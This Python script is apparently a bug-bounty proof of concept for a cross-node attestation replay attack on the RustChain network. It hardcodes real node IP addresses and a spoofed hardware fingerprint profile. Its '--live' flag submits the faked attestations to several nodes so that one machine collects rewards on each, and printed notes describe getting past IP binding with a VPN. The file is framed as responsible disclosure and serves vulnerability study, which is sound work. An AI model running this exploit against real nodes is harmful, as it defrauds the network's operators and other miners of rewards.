#!/usr/bin/env python3
"""
Proof of Concept: Cross-Node Attestation Replay Attack

Demonstrates that the same hardware can attest on multiple RustChain nodes
simultaneously and earn rewards on each, because nonces, hardware bindings,
and fingerprint histories are all stored in per-node local databases.

Bounty: rustchain-bounties#2296 (200 RTC)

RESPONSIBLE DISCLOSURE: This PoC uses --dry-run by default.
"""

import argparse
import hashlib
import json
import os
import sys
import time
from typing import Optional, Tuple

# ── RustChain Node Endpoints ─────────────────────────────────────
NODES = {
    "node1": "https://50.28.86.131",
    "node2": "https://50.28.86.153",
    "node3": "https://76.8.228.245",
}

# ── Hardware Profile (simulated real miner) ──────────────────────
MINER_PROFILE = {
    "miner": "exploit-test-miner",
    "device": {
        "device_arch": "g4",
        "device_family": "PowerBook",
        "device_model": "PowerBook5,8",
        "cores": 1,
        "cpu_serial": "XB435TTEST"
    },
    "signals": {
        "macs": ["00:11:22:33:44:55"],
        "hostname": "exploit-test"
    },
    "fingerprint": {
        "checks": {
            "clock_cv": 0.023,
            "clock_drift_hash": "a1b2c3d4e5f6",
            "cache_hash": "deadbeef12345678",
            "cache_l1": 32768,
            "cache_l2": 262144,
            "thermal_ratio": 1.05,
            "jitter_cv": 0.012,
            "jitter_map_hash": "1234abcd5678efgh",
            "simd_profile_hash": "9876543210abcdef"
        }
    }
}


def get_challenge(node_url: str, dry_run: bool = True) -> Optional[dict]:
    """Request a challenge nonce from a node."""
    if dry_run:
        # Simulate challenge response
        nonce = hashlib.sha256(f"{node_url}:{time.time()}".encode()).hexdigest()
        return {
            "nonce": nonce,
            "expires_at": int(time.time()) + 300,
            "server_time": int(time.time()),
            "node": node_url,
        }

    try:
        import urllib.request
        req = urllib.request.Request(
            f"{node_url}/attest/challenge",
            data=b"{}",
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        resp = urllib.request.urlopen(req, timeout=10)
        result = json.loads(resp.read())
        result["node"] = node_url
        return result
    except Exception as e:
        print(f"  [!] Challenge request failed for {node_url}: {e}")
        return None


def submit_attestation(node_url: str, nonce: str, dry_run: bool = True) -> Tuple[bool, dict]:
    """Submit attestation to a node using the provided nonce."""
    payload = dict(MINER_PROFILE)
    payload["report"] = {"nonce": nonce}

    if dry_run:
        # Simulate acceptance (the vulnerability we're demonstrating)
        return True, {
            "ok": True,
            "simulated": True,
            "node": node_url,
            "nonce": nonce[:16] + "...",
            "message": "Attestation would be accepted (node has no knowledge of other nodes)"
        }

    try:
        import urllib.request
        req = urllib.request.Request(
            f"{node_url}/attest/submit",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        resp = urllib.request.urlopen(req, timeout=10)
        result = json.loads(resp.read())
        return result.get("ok", False), result
    except Exception as e:
        return False, {"error": str(e)}


def demonstrate_attack(dry_run: bool = True, target_nodes: list = None):
    """
    Full attack demonstration:
    1. Get challenge from each node (each node issues its own nonce)
    2. Submit attestation to each node (each accepts because no cross-node check)
    3. Same hardware earns rewards on all nodes
    """
    nodes = target_nodes or list(NODES.items())[:2]  # Default: 2 nodes

    print("=" * 60)
    print("Cross-Node Attestation Replay Attack — PoC")
    print(f"Mode: {'DRY RUN (simulated)' if dry_run else '⚠️  LIVE'}")
    print(f"Target: {len(nodes)} nodes")
    print(f"Hardware: {MINER_PROFILE['device']['device_arch']} "
          f"({MINER_PROFILE['device']['device_model']})")
    print("=" * 60)

    # Phase 1: Get challenges from all nodes
    print("\n[Phase 1] Requesting challenge nonces from each node...")
    challenges = {}
    for name, url in nodes:
        ch = get_challenge(url, dry_run=dry_run)
        if ch:
            challenges[name] = ch
            print(f"  ✅ {name} ({url}): nonce={ch['nonce'][:16]}...")
        else:
            print(f"  ❌ {name} ({url}): failed")

    if len(challenges) < 2:
        print("\n[!] Need at least 2 nodes for cross-node replay. Aborting.")
        return False

    # Phase 2: Key insight — each nonce is node-local
    print("\n[Phase 2] Analyzing nonce isolation...")
    nonce_values = [ch["nonce"] for ch in challenges.values()]
    print(f"  Nonces are unique per node: {len(set(nonce_values)) == len(nonce_values)}")
    print(f"  Node 1 nonce: {nonce_values[0][:32]}...")
    print(f"  Node 2 nonce: {nonce_values[1][:32]}...")
    print("  ⚠️  Each node only validates its OWN nonces")
    print("  ⚠️  used_nonces table is LOCAL to each node")
    print("  ⚠️  hardware_bindings table is LOCAL to each node")

    # Phase 3: Submit attestation to each node
    print("\n[Phase 3] Submitting attestation to all nodes...")
    results = {}
    for name, ch in challenges.items():
        url = dict(nodes)[name]
        ok, result = submit_attestation(url, ch["nonce"], dry_run=dry_run)
        results[name] = (ok, result)
        status = "✅ ACCEPTED" if ok else "❌ REJECTED"
        print(f"  {status} on {name}: {json.dumps(result, indent=2)[:200]}")

    # Phase 4: Impact analysis
    accepted = sum(1 for ok, _ in results.values() if ok)
    print(f"\n[Phase 4] Results: {accepted}/{len(results)} nodes accepted")
    print(f"  Normal earnings: 1x reward per epoch")
    print(f"  Attack earnings: {accepted}x reward per epoch")
    print(f"  With MYTHIC multiplier (4.0x): {accepted * 4}x standard earnings")

    # Phase 5: Why it works
    print("\n[Phase 5] Why this works:")
    print("  1. Nonces are generated and stored per-node (SQLite, local file)")
    print("  2. used_nonces table only tracks nonces used on THAT node")
    print("  3. hardware_bindings table is node-local (no P2P sync)")
    print("  4. fingerprint_submissions table is node-local")
    print("  5. anti_double_mining.py only deduplicates within a single node")
    print("  6. No cross-node gossip protocol for attestation events")
    print("  7. IP-based binding is bypassable with VPN per node")

    return accepted >= 2


def analyze_source_code():
    """Trace the vulnerability through the source code."""
    print("\n" + "=" * 60)
    print("Source Code Analysis")
    print("=" * 60)

    vulns = [
        {
            "file": "node/rustchain_v2_integrated_v2.2.1_rip200.py",
            "line": "~2457",
            "function": "get_challenge()",
            "issue": "Nonce stored in local DB_PATH SQLite",
            "severity": "HIGH",
        },
        {
            "file": "node/rustchain_v2_integrated_v2.2.1_rip200.py",
            "line": "~2507",
            "function": "_check_hardware_binding()",
            "issue": "Hardware binding lookup is node-local",
            "severity": "HIGH",
        },
        {
            "file": "node/hardware_fingerprint_replay.py",
            "line": "~75",
            "function": "init_replay_defense_schema()",
            "issue": "Fingerprint submission history is node-local",
            "severity": "MEDIUM",
        },
        {
            "file": "node/anti_double_mining.py",
            "line": "~50",
            "function": "compute_machine_identity_hash()",
            "issue": "Machine identity only deduplicated per-node",
            "severity": "MEDIUM",
        },
        {
            "file": "node/rustchain_v2_integrated_v2.2.1_rip200.py",
            "line": "~2478",
            "function": "_compute_hardware_id()",
            "issue": "IP component in hw_id allows VPN bypass",
            "severity": "MEDIUM",
        },
    ]

    for v in vulns:
        print(f"\n  [{v['severity']}] {v['file']}:{v['line']}")
        print(f"    Function: {v['function']}")
        print(f"    Issue: {v['issue']}")

    return vulns


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Cross-Node Attestation Replay Attack PoC")
    parser.add_argument("--live", action="store_true", help="Run against real nodes (CAUTION)")
    parser.add_argument("--analyze", action="store_true", help="Source code analysis only")
    args = parser.parse_args()

    if args.analyze:
        analyze_source_code()
    else:
        demonstrate_attack(dry_run=not args.live)
        analyze_source_code()
